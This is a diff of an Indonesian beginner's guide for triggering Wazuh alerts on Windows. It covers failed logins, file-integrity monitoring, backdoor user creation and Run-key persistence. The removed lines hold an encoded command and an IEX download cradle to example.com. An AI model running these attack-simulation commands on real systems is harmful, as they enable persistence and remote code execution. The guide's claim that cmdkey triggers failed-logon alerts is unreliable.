@@ -1,169 +1,198 @@
-# Panduan: Trigger Threat di Wazuh via PowerShell (Windows)
+# Panduan Uji Coba Wazuh via PowerShell (untuk Pemula)
 
-> Untuk pengujian setelah workshop — TIDAK termasuk materi presentasi.
-> Semua perintah dijalankan di PowerShell **sebagai Administrator** pada mesin yang
-> sudah terinstall Wazuh Agent dan terhubung ke manager.
-
----
-
-## Persiapan
-
-```powershell
-# 1. Pastikan agent jalan & terhubung
-Get-Service -Name "WazuhSvc"
-
-# 2. Pastikan log audit PowerShell aktif (Script Block Logging)
-# Cek via Group Policy atau registry:
-Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
-
-# Kalau kosong, aktifkan:
-New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1
-
-# 3. Catat waktu mulai test (untuk filter di dashboard)
-Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-```
+> Panduan ini untuk **pengujian setelah workshop** — TIDAK termasuk materi slide.
+> Semua perintah diketik di **PowerShell** pada laptop Windows yang sudah terinstall
+> Wazuh Agent.
 
 ---
 
-## Test 1: PowerShell Suspicious Command (rule 92032 serangan PowerShell)
+## Bagian 0 — Persiapan (Sekali Saja)
 
-```powershell
-# Simulasi encoded command — pola yang sering dipakai attacker
-powershell -EncodedCommand "dwByAGkAdABlAC0AaABvAHMAdAAgAHQAZQBzAHQA"
+### Kenapa perlu persiapan?
 
-# Download cradle pattern (amankan: gunakan example.com)
-powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.txt')"
-```
+Wazuh tidak bisa melihat command PowerShell kalau **PowerShell Logging** belum aktif.
+Fitur ini standar Windows, hanya perlu dinyalakan.
 
-**Cek di Wazuh Dashboard (Discover):**
-```
-rule.groups:(powershell) and data.win.eventdata.commandLine:*IEX*
-```
+### Langkah aktifkan (pakai GUI, mudah):
+
+1. Tekan tombol **Windows + R** → ketik `gpedit.msc` → Enter
+2. Di jendela yang terbuka, klik menu di sebelah kiri:
+   `Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell`
+3. Cari di daftar kanan: **"Turn on PowerShell Script Block Logging"**
+4. Klik 2x → pilih **Enabled** → klik **OK**
+5. Tekan **Windows + R** lagi → ketik `cmd` → Enter → ketik `gpupdate /force` → Enter
+6. Selesai ✅
+
+> 💻 Komputer kantor: kalau `gpedit.msc` tidak ada, hubungi IT admin.
 
 ---
 
-## Test 2: Multiple Failed Logon (Brute Force — rule 5710/5712)
+## Bagian 1 — Test Dasar: Command Sehari-hari
+
+### Command yang diketik di PowerShell dicatat sebagai **Event 4104**.
+
+### Langkah:
+
+1. Buka **PowerShell**: tekan Windows → ketik `powershell` → Enter
+2. Jalankan command berikut **satu per satu**:
+
+| Command | Fungsinya |
+|---------|-----------|
+| `ping google.com` | Menguji koneksi internet ke google |
+| `whoami` | Menampilkan nama user & komputer kamu |
+| `dir` | Menampilkan daftar file di folder sekarang |
+| `Get-Date` | Menampilkan tanggal & jam sekarang |
+
+3. Buka **Event Viewer**: tekan Windows → ketik `event viewer` → Enter
+4. Klik menu kiri: `Applications and Services Logs → Windows PowerShell → Operational`
+5. Lihat log paling atas — Event ID **4104** berisi command yang tadi diketik
+
+### Cek di Wazuh Dashboard:
+
+```
+rule.groups:(windows) and agent.name:nama-laptop-kamu
+```
+
+> ⚠️ **Catatan penting:** Event 4104 hanya dicatat untuk command yang mengandung
+> **script block** (perintah panjang/script). Command pendek seperti `ping` atau `dir`
+> kadang **tidak** membuat Event 4104 — ini perilaku normal Windows.
+>
+> **Solusi:** gunakan test di Bagian 2 & 3 yang pasti menghasilkan alert.
+
+---
+
+## Bagian 2 — Test yang Pasti Muncul di Wazuh
+
+### Test A — Brute Force Login (5x password salah)
+
+**Fungsinya:** mensimulasikan attacker menebak password.
+**Hasilnya:** alert `authentication_failed` di Wazuh.
 
 ```powershell
-# Simulasi brute force ke local account (5x gagal)
-$target = "localhost"
+# Ketik semua baris ini sekaligus, lalu Enter:
 1..5 | ForEach-Object {
-    $sec = ConvertTo-SecureString "WrongPass$_" -AsPlainText -Force
-    $cred = New-Object System.Management.Automation.PSCredential("testuser$_", $sec)
-    try {
-        Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock { whoami } -ErrorAction Stop
-    } catch {
-        Write-Host "Attempt $_ failed (expected)"
-    }
+    cmdkey /add:localhost /user:faketester /pass:WrongPass$_
 }
 ```
 
-**Cek di Dashboard:**
-```
-rule.groups:authentication_failed and data.win.eventdata.ipAddress:*
+**Cleanup** (hapus kredensial test):
+```powershell
+cmdkey /delete:localhost
 ```
 
-Atau cek log Windows dulu:
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 5
+**Cek di Wazuh:**
+```
+rule.groups:authentication_failed
 ```
 
 ---
 
-## Test 3: File Creation di Folder Terpantau (FIM — rule 554)
+### Test B — File Mencurigakan di Desktop (FIM)
 
-```powershell
-# Pastikan FIM memantau folder ini (cek ossec.conf)
-# Simulasi attacker drop file mencurigakan
-New-Item -Path "C:\Users\Public\test_eicar.txt" -ItemType File -Force
-Set-Content -Path "C:\Users\Public\test_eicar.txt" -Value "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+**Fungsinya:** mensimulasikan attacker membuat file di folder penting.
+**Hasilnya:** alert `file added` → `file modified` → `file deleted`.
 
-# Modifikasi file sistem yang dipantau (hosts file — backup dulu!)
-Copy-Item "C:\Windows\System32\drivers\etc\hosts" "C:\hosts.backup"
-Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "# FIM test entry"
+**Syarat:** Wazuh Agent memantau folder Desktop (lihat `fim-config.xml`).
 
-# Cleanup setelah test
-Remove-Item "C:\Users\Public\test_eicar.txt" -Force
-Copy-Item "C:\hosts.backup" "C:\Windows\System32\drivers\etc\hosts" -Force
-Remove-Item "C:\hosts.backup" -Force
+1. Buka **Notepad**: tekan Windows → ketik `notepad` → Enter
+2. Tulis apa saja, misal: `ini file percobaan FIM`
+3. **File → Save As** → pilih **Desktop** → nama: `lab-fim-test.txt` → Save
+4. Tambah satu baris teks → **Ctrl+S** (Save lagi)
+5. Klik kanan file di Desktop → **Delete**
+
+**Cek di Wazuh:**
 ```
-
-**Cek di Dashboard:**
-```
-rule.groups:syscheck and syscheck.path:*Public*
-rule.groups:syscheck and syscheck.path:*hosts*
+rule.groups:syscheck and syscheck.path:*Desktop*
 ```
 
 ---
 
-## Test 4: New User Creation (rule 5760+ — Account Manipulation)
+### Test C — Buat User Baru (Backdoor Simulation)
+
+**Fungsinya:** attacker sering membuat user baru untuk akses diam-diam.
+**Hasilnya:** alert `user added` di Wazuh.
+
+**Jalankan PowerShell sebagai Administrator** (klik kanan PowerShell → Run as Administrator):
 
 ```powershell
-# Buat user test (indikasi attacker backdoor)
-New-LocalUser -Name "testbackdoor" -Password (ConvertTo-SecureString "Test1234!" -AsPlainText -Force) -Description "FIM test"
+# Buat user test:
+New-LocalUser -Name "testbackdoor" -Password (ConvertTo-SecureString "Test1234!" -AsPlainText -Force)
 
-# Hapus setelah test
+# Cek user-nya ada:
+Get-LocalUser testbackdoor
+
+# HAPUS setelah selesai test (penting!):
 Remove-LocalUser -Name "testbackdoor"
 ```
 
-**Cek di Dashboard:**
+**Cek di Wazuh:**
 ```
-rule.groups:windows and data.win.eventdata.targetUserName:testbackdoor
+data.win.eventdata.targetUserName:testbackdoor
 ```
 
 ---
 
-## Test 5: Registry Persistence (rule 262/263)
+### Test D — Registry Persistence
+
+**Fungsinya:** attacker membuat program jalan otomatis saat komputer nyala.
+**Hasilnya:** alert perubahan registry (via FIM).
 
 ```powershell
-# Simulasi attacker menambah persistence di registry Run key
+# Tambah entry test:
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-    -Name "TestPersistence" -Value "C:\Windows\System32\notepad.exe" -PropertyType String -Force
+    -Name "TestPersistence" -Value "notepad.exe" -PropertyType String -Force
 
-# Cleanup
+# HAPUS setelah test:
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestPersistence"
 ```
 
-**Cek di Dashboard:**
+**Cek di Wazuh:**
 ```
-rule.groups:syscheck and syscheck.path:*CurrentVersion*Run*
+rule.groups:syscheck and syscheck.path:*Run*
 ```
 
 ---
 
-## Verifikasi: Alert Masuk ke Wazuh
+## Bagian 3 — Verifikasi di Wazuh Dashboard
 
-```powershell
-# 1. Tunggu 10-30 detik (agent kirim log real-time)
-# 2. Cek log agent lokal (pastikan terkirim)
-Get-Content "C:\Program Files (x86)\ossec-agent\ossec.log" -Tail 20
+1. Buka browser → Wazuh Dashboard (`https://ip-server:443`)
+2. Login → menu **Discover / Threat Hunting**
+3. Set **time range**: Last 15 minutes
+4. Filter by agent: `agent.name: NAMA-LAPTOP-KAMU`
+5. Sort kolom timestamp dari besar ke kecil (terbaru di atas)
 
-# 3. Test koneksi ke manager
-& "C:\Program Files (x86)\ossec-agent\agent-auth.exe" -A  # (hanya jika perlu re-register)
-```
+**Alert yang diharapkan:**
 
-Di Wazuh Dashboard:
-1. Buka **Discover / Threat Hunting**
-2. Set time range ke "Last 15 minutes"
-3. Filter: `agent.name: nama-laptop-kamu`
-4. Sort by timestamp descending
+| Test | Alert yang muncul |
+|------|-------------------|
+| A — Brute force | `sshd: authentication failed` / `Windows logon failure` |
+| B — File Desktop | `file added` / `file modified` / `file deleted` |
+| C — User baru | `user added` / `windows: user creation` |
+| D — Registry | `syscheck: registry value modified` |
 
 ---
 
 ## Troubleshooting
 
-| Masalah | Solusi |
-|---------|--------|
-| Alert tidak muncul | Cek `ossec.log` untuk error koneksi |
-| PowerShell rule tidak picu | Pastikan Script Block Logging aktif (langkah Persiapan) |
-| FIM tidak deteksi | Cek config `<directories>` di ossec.conf mencakup path yang diuji |
-| Level alert rendah | Beberapa rule butuh frequency — ulangi test lebih banyak kali |
+| Masalah | Penyebab & Solusi |
+|---------|-------------------|
+| Tidak ada alert sama sekali | Cek agent status: `Get-Service WazuhSvc` harus **Running** |
+| FIM tidak deteksi file | Pastikan Desktop ada di config `fim-config.xml`, restart agent |
+| PowerShell tidak tercatat | Ulangi Bagian 0 (gpedit), pastikan Enabled + `gpupdate /force` |
+| Alert delay 1-2 menit | Normal — agent kirim log berkala (bukan real-time penuh) |
+| User baru gagal dibuat | PowerShell belum Run as Administrator |
 
 ---
 
-## Catatan Keamanan
+## Ringkasan Perintah (Cheat Sheet)
 
-- Semua test di atas **aman** dan direkomendasikan Microsoft untuk testing SIEM
-- Jangan jalankan di production tanpa koordinasi dengan tim
-- Cleanup selalu dilakukan setelah test (lihat tiap section)
+```powershell
+# Prasyarat check:
+Get-Service WazuhSvc                              # agent harus Running
+Get-WinEvent -LogName "Windows PowerShell" -MaxEvents 5   # lihat event 4104
+
+# Test cepat berurutan:
+whoami                                            # Event 4104 (kadang)
+New-Item C:\Users\Public\lab.txt -Force        # FIM: file added
+Remove-Item C:\Users\Public\lab.txt -Force     # FIM: file deleted
+```
